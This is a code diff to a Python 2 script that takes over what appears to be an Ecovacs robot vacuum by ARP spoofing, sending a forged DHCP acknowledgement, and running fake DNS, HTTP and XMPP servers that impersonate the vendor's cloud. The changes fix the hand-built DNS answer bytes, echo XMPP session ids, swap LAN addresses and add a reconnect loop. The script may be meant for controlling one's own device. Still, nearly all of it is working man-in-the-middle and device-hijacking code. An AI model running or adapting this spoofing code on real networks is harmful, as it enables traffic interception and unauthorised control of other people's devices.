@@ -218,13 +218,13 @@ class Spoofer:
                 payload += "\x00\x01" #Questions
                 payload += "\x00\x01" #Answer RRs
                 payload += "\x00\x00\x00\x00" #Authority RRs and Additional RRs. Flags End
-                payload += "\x05" #Queries start
-                payload += "\x6c\x62\x2d\x6e\x61" #Subdomain
-                payload += "\x07" #Separator
+                payload += "\x03" #Subdomain Length
+                payload += "\x6c\x62\x6f" #Subdomain
+                payload += "\x07" #Domain Length
                 payload += "\x65\x63\x6f\x75\x73\x65\x72" #Domain
-                payload += "\x03" #Separator
+                payload += "\x03" #TLD Length
                 payload += "\x6e\x65\x74" #Top Level Domain
-                payload += "\x00" #Separator
+                payload += "\x00" #Separator/End of domains
                 payload += "\x00\x01" #Type A Host Address
                 payload += "\x00\x01" #Class IN
                 payload += "\xc0\x0c" #Name. Answers Start
@@ -300,8 +300,6 @@ class Spoofer:
         xmlr2 = '<stream:features><auth xmlns="http://jabber.org/features/iq-auth"/><starttls xmlns="urn:ietf:params:xml:ns:xmpp-tls"><required/></starttls><mechanisms xmlns="urn:ietf:params:xml:ns:xmpp-sasl"><mechanism>PLAIN</mechanism></mechanisms></stream:features>'
         xmlr3 = '<success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/>'
         xmlr4 = '<stream:features><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"/><session xmlns="urn:ietf:params:xml:ns:xmpp-session"/></stream:features>'
-        xmlr5 = '<iq type="result" id="0"><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"><jid>' + tomail + '</jid></bind></iq>'
-        xmlr6 = '<iq type="result" id="1"/>'
         xmlr7 = '<presence to="' + tomail + '"> dummy </presence>'
         batt_info = '<iq id="6222" to="' + tomail + '" from="' + frommail + '" type="set"><query xmlns="com:ctl"><ctl td="GetBatteryInfo"/></query></iq>'
 
@@ -322,8 +320,12 @@ class Spoofer:
             connection.send(xmlr1)
             connection.send(xmlr4)
             data = connection.recv(4096)
+            idno = re.search('id=\'(.+?)\'>', data).group(1)
+            xmlr5 = '<iq type="result" id="' + idno + '"><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"><jid>' + tomail + '</jid></bind></iq>'
             connection.send(xmlr5)
             data = connection.recv(4096)
+            idno = re.search('id=\'(.+?)\'>', data).group(1)
+            xmlr6 = '<iq type="result" id="' + idno + '"/>'
             connection.send(xmlr6)
             data = connection.recv(4096)
             print '[*] Auth Sequence completed'
@@ -453,7 +455,7 @@ class Action:
 
             if (keypress == 'l'):
                 print '[!] Stopping!'
-                exit(0)
+                return False
 
             if (keypress == 'w'):
                 connection.send(self.move('forward'))
@@ -483,11 +485,11 @@ def getkey():
         termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
     return key
 
-sip = '192.168.10.100'
-tip = '192.168.10.195'
+sip = '192.168.1.150'
+tip = '192.168.1.2'
 nmask = '255.255.255.0'
-tomail = ''           # These are your robot's to-from email
-frommail = ''         # addresses. Can't send commands without them
+tomail = 'longstringhere@126.ecorobot.net/atom'                  # These are your robot's to-from email
+frommail = 'anotherlongstringhere@ecouser.net/andanotherstring'  # addresses. Can't send commands without them.
 
 spoof = Spoofer()
 sniff = Sniffer()
@@ -501,6 +503,11 @@ spoof.set_arp(mac,tip)
 spoof.dhcp_ack(mac,sip,tip,nmask)
 spoof.dns_serv(sip,tip)
 spoof.http_serv(sip)
-spoof.robo_comms(sip,tomail,frommail)
-act.controller(spoof.connection)
+check = True
+while check == True:
+    try:
+        spoof.robo_comms(sip,tomail,frommail)
+        check = act.controller(spoof.connection)
+    except:
+        print "Connection lost, attempting to reconnect..."
 spoof.del_arp(tip)
